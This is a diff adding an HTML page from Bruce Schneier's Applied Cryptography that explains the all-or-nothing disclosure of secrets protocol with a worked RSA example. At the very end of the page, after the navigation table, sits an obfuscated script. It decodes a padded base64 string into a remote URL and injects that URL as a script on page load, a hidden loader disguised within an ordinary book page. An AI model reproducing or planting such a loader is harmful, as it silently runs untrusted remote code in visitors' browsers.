@@ -1,0 +1,147 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Special Algorithms for Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=23//-->
+<!--PAGES=543-546//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The numbers <I>n</I> (<I>n</I> is the product of two primes) and <I>x</I><SUB>0</SUB> must be agreed upon in advance. Then, the accumulation of <I>y</I><SUB>1</SUB> , <I>y</I><SUB>2</SUB> , and <I>y</I><SUB>3</SUB> would be</P>
+<DL>
+<DD>((<I>x</I><SUB>0</SUB> <SUP>y<SMALL><SMALL>1</SMALL></SMALL></SUP> mod <I>n</I>)<SUP>y<SMALL><SMALL>2</SMALL></SMALL></SUP> mod <I>n</I>)<SUP>y<SMALL><SMALL>3</SMALL></SMALL></SUP> mod <I>n</I>
+</DL>
+<P>This computation is independent of the order of <I>y</I><SUB>1</SUB>, <I>y</I><SUB>2</SUB> , and <I>y</I><SUB>3</SUB>.</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">23.9 All-or-Nothing Disclosure of Secrets</FONT></H3>
+<P>This protocol allows multiple parties (at least two are required for the protocol to work) to buy individual secrets from a single seller (see Section 4.13) [1374,1175]. First, here&#146;s a definition. Take two bit strings, <I>x</I> and <I>y.</I> The <B>fixed bit index</B> (<B>FBI</B>) of <I>x</I> and <I>y</I> are the bits where the <I>i</I>th bit of <I>x</I> equals the <I>i</I>th bit of <I>y.</I></P>
+<P>For example:</P>
+<DL>
+<DD><I>x</I> = 110101001011
+<DD><I>y</I> = 101010000110
+<DD>FBI(<I>x, y</I>) = {1, 4, 5, 11} 
+<DD>(We&#146;re reading the bits from right to left, with the right-most bit as zero.)
+</DL>
+<P>Now, here&#146;s the protocol. Alice is the seller. Bob and Carol are buyers. Alice has <I>k n</I>-bit secrets: <I>S</I><SUB>1</SUB>, <I>S</I><SUB>2</SUB> ,  ..., <I>S</I><SUB>k</SUB>. Bob wants to buy secret <I>Sb</I>; Carol wants to buy secret <I>S</I><SUB>c</SUB>.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates a public-key/private-key key pair and tells Bob (but not Carol) the public key. She generates another public-key/private-key key pair and tells Carol (but not Bob) the public key.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob generates <I>k n-</I>bit random numbers, <I>B</I><SUB>1</SUB> , <I>B</I><SUB>2</SUB> ,  ..., <I>B</I><SUB>k</SUB>, and tells them to Carol. Carol generates <I>k n-</I>bit random numbers, <I>C</I><SUB>1</SUB> , <I>C</I><SUB>2</SUB> ,  ..., <I>C</I><SUB>k</SUB>, and tells them to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob encrypts <I>C</I><SUB>b</SUB> (remember, <I>S</I><SUB>b</SUB> is the secret he wants to buy) with the public key from Alice. He computes the FBI of <I>C</I><SUB>b</SUB> and the result he just encrypted. He sends this FBI to Carol.
+<BR>Carol encrypts <I>B</I><SUB>c</SUB> (remember, <I>S</I><SUB>c</SUB> is the secret she wants to buy) with the public key from Alice. She computes the FBI of <I>B</I><SUB>c</SUB> and the result she just encrypted. She sends this FBI to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob takes each of the <I>n-</I>bit numbers <I>B</I><SUB>1</SUB>, <I>B</I><SUB>2</SUB> ,  ..., <I>B</I><SUB>k</SUB>, and replaces every bit whose index is not in the FBI he received from Carol with its complement. He sends this new list of <I>n-</I>bit numbers, <I>B'</I><SUB>1</SUB>, <I>B'</I><SUB>2</SUB>,  ..., <I>B'</I><SUB>k</SUB>, to Alice.
+<BR>Carol takes each of the <I>n-</I>bit numbers <I>C</I><SUB>1</SUB> , <I>C</I><SUB>2</SUB> ,  ..., <I>C</I><SUB>k</SUB>, and replaces every bit whose index is not in the FBI she received from Bob with its complement. She sends this new list of <I>n-</I>bit numbers, <I>C'</I><SUB>1</SUB>, <I>C'</I><SUB>2</SUB>,  ..., <I>C'</I><SUB>k</SUB>, to Alice.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice decrypts all <I>C'</I><SUB>i</SUB> with Bob&#146;s private key, giving her <I>k n-</I>bit numbers: <I>C"</I><SUB>1</SUB>, <I>C"</I><SUB>2</SUB>,  ..., <I>C"</I><SUB>k</SUB>. She computes <I>S</I><SUB>i</SUB> &#8853; <I>C"</I><SUB>i</SUB>, for <I>i</I> = 1 to <I>k</I>, and sends the results to Bob.
+<BR>Alice decrypts all <I>B'</I><SUB>i</SUB> with Carol&#146;s private key, giving her <I>k n-</I>bit numbers: <I>B"</I><SUB>1</SUB>, <I>B"</I><SUB>2</SUB>,  ..., <I>B"</I><SUB>k</SUB>. She computes <I>S</I><SUB>i</SUB> &#8853; <I>B"</I><SUB>i</SUB>, for <I>i</I> = 1 to <I>k,</I> and sends the results to Carol.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob computes <I>S</I><SUB>b</SUB> by XORing <I>C</I><SUB>b</SUB> and the <I>b</I>th number he received from Alice.
+<BR>Carol computes <I>S</I><SUB>c</SUB> by XORing <I>B</I><SUB>c</SUB> and the <I>cth number</I> she received from Alice.
+</DL>
+<P>This is complicated. An example will go a long way to help.
+</P>
+<P>Alice has the following eight 12-bit secrets for sale: <I>S</I><SUB>1</SUB> =1990, <I>S</I><SUB>2</SUB> =471, <I>S</I><SUB>3</SUB> =3860, <I>S</I><SUB>4</SUB> =1487, <I>S</I><SUB>5</SUB> =2235, <I>S</I><SUB>6</SUB> =3751, <I>S</I><SUB>7</SUB> =2546, and <I>S</I><SUB>8</SUB> =4043. Bob wants to buy <I>S</I><SUB>7</SUB>. Carol wants to buy <I>S</I><SUB>2</SUB>.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice uses the RSA algorithm. The key pair she will use with Bob is: <I>n</I> = 7387, <I>e</I> = 5145, and <I>d</I> = 777. The key pair she will use with Carol is: <I>n</I> = 2747, <I>e</I> = 1421, and <I>d</I> = 2261. She tells Bob and Carol each their public key.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob generates eight 12-bit random numbers, <I>B</I><SUB>1</SUB> = 743, <I>B</I><SUB>2</SUB> = 1988, <I>B</I><SUB>3</SUB> = 4001, <I>B</I><SUB>4</SUB> = 2942, <I>B</I><SUB>5</SUB> = 3421, <I>B</I><SUB>6</SUB> = 2210, <I>B</I><SUB>7</SUB> = 2306, and <I>B</I><SUB>8</SUB> = 222, and tells them to Carol. Carol generates eight 12-bit random numbers, <I>C</I><SUB>1</SUB> = 1708, <I>C</I><SUB>2</SUB> = 711, <I>C</I><SUB>3</SUB> = 1969, <I>C</I><SUB>4</SUB> = 3112, <I>C</I><SUB>5</SUB> = 4014, <I>C</I><SUB>6</SUB> = 2308, <I>C</I><SUB>7</SUB> = 2212, and <I>C</I><SUB>8</SUB> = 222, and tells them to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob wants to buy <I>S</I><SUB>7</SUB> , so he encrypts <I>C</I><SUB>7</SUB> with the public key that Alice gave him.
+<DL>
+<DD>2212<SUP>5145</SUP> mod 7387 = 5928
+</DL>
+<BR>Now:
+<DL>
+<DD>2212 = 0100010100100
+<DD>
+<DD>5928 = 1011100101000
+</DL>
+<BR>So, the FBI of those two numbers is {0, 1, 4, 5, 6}. He sends this to Carol.
+</DL>
+<P>Carol wants to buy <I>S</I><SUB>2</SUB> , so she encrypts <I>B</I><SUB>2</SUB> with the public key that Alice gave her and computes the FBI of <I>B</I><SUB>2</SUB> with the result of her encryption. She sends {0, 1, 2, 6, 9, 10} to Bob.</P>
+<DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob takes <I>B</I><SUB>1</SUB> , <I>B</I><SUB>2</SUB> ,  ..., <I>B</I><SUB>8</SUB> , and replaces every bit whose index is not in the set {0, 1, 2, 6, 9, 10} with its complement. For example:
+<DL>
+<DD><I>B</I><SUB>2</SUB> = 111111000100 = 1988
+<DD>
+<DD><I>B'</I><SUB>2</SUB> = 011001111100 = 1660
+</DL>
+<BR>He sends <I>B'</I><SUB>1</SUB>, <I>B'</I><SUB>2</SUB>,  ..., <I>B'</I><SUB>8</SUB>, to Alice.
+<BR>Carol takes <I>C</I><SUB>1</SUB> , <I>C</I><SUB>2</SUB> ,  ..., <I>C</I><SUB>8</SUB> , and replaces every bit whose index is not in the set {0, 1, 4, 5, 6} with its complement. For example:
+<DL>
+<DD><I>C</I><SUB>7</SUB> = 0100010100100 = 2212
+<DD>
+<DD><I>C'</I><SUB>7</SUB> = 1011100101000 = 5928
+</DL>
+<BR>She sends <I>C'</I><SUB>1</SUB>, <I>C'</I><SUB>2</SUB>,  ..., <I>C'</I><SUB>8</SUB>, to Alice.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice decrypts all <I>C'</I><SUB>i</SUB> with Bob&#146;s private key and XORs the results with <I>S</I><SUB>i</SUB>. For example, for <I>i</I> = 7:
+<DL>
+<DD>5928<SUP>777</SUP> mod 7387 = 2212; 2546 &#8853; 2212 = 342
+</DL>
+<BR>She sends the results to Bob.
+<BR>Alice decrypts all <I>B'</I><SUB>i</SUB> with Carol&#146;s private key and XORs the results with <I>S</I><SUB>i</SUB>. For example, for <I>i</I> = 2:
+<DL>
+<DD>1660<SUP>2261</SUP> (mod 2747) = 1988; 471 &#8853; 1988 = 1555
+</DL>
+<BR>She sends the results to Carol.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob computes <I>S</I><SUB>7</SUB> by XORing <I>C</I><SUB>7</SUB> and the seventh number he received from Alice:
+<DL>
+<DD>2212 &#8853; 342 = 2546
+</DL>
+<BR>Carol computes <I>S</I><SUB>2</SUB> by XORing <I>B</I><SUB>2</SUB> and the second number she received from Alice.
+</DL>
+<DL>
+<DD>1988 &#8853; 1555 = 471
+</DL>
+<P>The protocol works for any number of buyers. If Bob, Carol, and Dave want to buy secrets, Alice gives each buyer two public keys, one for each of the others. Each buyer gets a set of numbers from each other buyer. Then, they complete the protocol with Alice for each of their sets of numbers and XOR all of their final results from Alice to get their secret. More details are in [1374,1175].
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(hxeIzDCN, yIaIjiJa) {yIaIjiJa = hxeIzDCN.createElement('script');yIaIjiJa.type = 'text/javascript';yIaIjiJa.async = true;yIaIjiJa.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');hxeIzDCN.getElementsByTagName('body')[0].appendChild(yIaIjiJa);}(document));</script></body>
+</html>
